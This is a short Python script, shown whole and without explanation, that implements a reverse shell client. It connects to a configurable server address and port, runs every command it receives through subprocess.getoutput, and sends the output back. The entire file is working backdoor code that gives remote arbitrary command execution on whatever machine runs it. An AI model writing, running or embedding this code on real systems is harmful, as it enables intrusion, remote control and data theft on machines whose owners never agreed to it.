import socket
import subprocess

def main():
    SERVER_HOST = 'localhost'  # Change this to your server's IP address if needed
    SERVER_PORT = 12345        # Change this to your server's port number

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))

    try:
        while True:
            command = client_socket.recv(4096).decode()
            if not command:
                break
            if command.lower() == 'exit':
                break

            output = subprocess.getoutput(command)
            client_socket.sendall(output.encode())
    except Exception as e:
        print("Error:", e)
    finally:
        client_socket.close()

if __name__ == "__main__":
    main()
